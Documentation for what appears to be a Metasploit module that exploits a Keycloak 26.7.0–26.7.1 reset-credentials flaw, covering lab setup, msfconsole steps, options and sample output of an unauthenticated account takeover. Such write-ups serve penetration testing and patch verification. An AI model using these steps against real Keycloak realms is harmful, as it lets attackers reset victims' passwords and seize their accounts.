## Vulnerable Application

Keycloak **26.7.0** and **26.7.1** ship a broken "try another way" credential selector in
the reset-credentials (Forgot Password) flow (**CVE-2026-18963**). When the selector screen
is rendered it stores an authentication session note that is not scoped to the current
authenticator execution. An attacker can walk the reset flow, switch to the credential
selector, name a victim, and then drive the email reset authenticator to `success()` without
ever submitting the one-time token that Keycloak mailed to the account owner. The flow then
moves straight to the update-password screen, so an unauthenticated attacker can set a new
password for any account in a realm that has "Forgot password" enabled. The issue is fixed in
**26.7.2**.

The only preconditions are:

* the target realm has **Forgot password** (`resetPasswordAllowed`) turned on, and
* a valid `client_id` plus a `redirect_uri` that client accepts.

Every realm ships the built-in `account` client, whose default valid redirect is
`/realms/<realm>/account/*`, so the module uses that client by default and needs no
knowledge of the realm's custom clients. Keycloak does not disclose its build version over
HTTP (the theme resource path is a build hash, not a semver), so `check` confirms that the
reset-credentials flow is reachable rather than fingerprinting a version; `run` proves the
finding by setting a password and logging in with it.

This module reaches the update-password screen for a chosen victim without the emailed token,
sets an attacker controlled password, and then performs a fresh login to confirm the
takeover.

### Setting up a vulnerable environment

Run Keycloak 26.7.1 and give it a realm with Forgot Password enabled plus a victim user:

```
docker run --rm -p 8080:8080 \
  -e KC_BOOTSTRAP_ADMIN_USERNAME=admin -e KC_BOOTSTRAP_ADMIN_PASSWORD=admin \
  quay.io/keycloak/keycloak:26.7.1 start-dev
```

```
KCADM=/opt/keycloak/bin/kcadm.sh
$KCADM config credentials --server http://localhost:8080 --realm master --user admin --password admin
$KCADM create realms -s realm=demo -s enabled=true -s resetPasswordAllowed=true
$KCADM create users  -r demo -s username=victim -s email=victim@example.com -s enabled=true
$KCADM set-password  -r demo --username victim --new-password Origin@l1
```

The `account` client is created automatically with the realm, so no further client setup is
needed.

## Verification Steps

1. Start `msfconsole`.
2. `use auxiliary/admin/http/keycloak_reset_credentials_ato`
3. `set RHOSTS <keycloak-host>`
4. `set REALM demo`
5. `set VICTIM victim`
6. (optional) `set NEW_PASSWORD <chosen password>`, otherwise one is generated.
7. `check` should report that the reset-credentials flow is enabled.
8. `run`
9. The victim's new password is printed and, on a live database, stored as a credential.

## Options

### REALM
Name of the target realm. Required. Default `master`.

### CLIENT_ID
The OIDC `client_id` used to open the flow. Any client in the realm works. The default
`account` is the built-in account console client, which is present in every realm. Required.

### REDIRECT_URI
A `redirect_uri` that `CLIENT_ID` accepts. Left blank, the module uses the built-in account
console URL (`<base>/realms/<realm>/account/`), which is the default valid redirect for the
`account` client. Set this when you point `CLIENT_ID` at a custom client.

### VICTIM
Username or email of the account to take over. Required.

### NEW_PASSWORD
Password to set on the victim account. Left blank, the module generates one that satisfies a
typical password policy and prints it.

## Scenarios

### Keycloak 26.7.1, taking over a user through the built-in account client

```
msf6 > use auxiliary/admin/http/keycloak_reset_credentials_ato
msf6 auxiliary(admin/http/keycloak_reset_credentials_ato) > set RHOSTS 172.16.10.20
msf6 auxiliary(admin/http/keycloak_reset_credentials_ato) > set REALM demo
msf6 auxiliary(admin/http/keycloak_reset_credentials_ato) > set VICTIM victim
msf6 auxiliary(admin/http/keycloak_reset_credentials_ato) > check
[*] 172.16.10.20:8080 - The service is running, but could not be validated. reset-credentials flow is enabled; run to confirm the takeover (Keycloak does not disclose its version remotely)
msf6 auxiliary(admin/http/keycloak_reset_credentials_ato) > run
[*] Running module against 172.16.10.20
[+] Reached the update-password screen for victim without the emailed token
[*] Submitted a new password for victim
[+] Account takeover confirmed: victim : Flrjedfz525!
[*] Auxiliary module execution completed
```

### Custom client with an off-origin callback

When the realm's account client is disabled, point the module at another public client and
supply a redirect it accepts:

```
msf6 auxiliary(admin/http/keycloak_reset_credentials_ato) > set CLIENT_ID webapp
msf6 auxiliary(admin/http/keycloak_reset_credentials_ato) > set REDIRECT_URI https://app.example.com/callback
msf6 auxiliary(admin/http/keycloak_reset_credentials_ato) > set NEW_PASSWORD Sup3rSecret!
msf6 auxiliary(admin/http/keycloak_reset_credentials_ato) > run
```
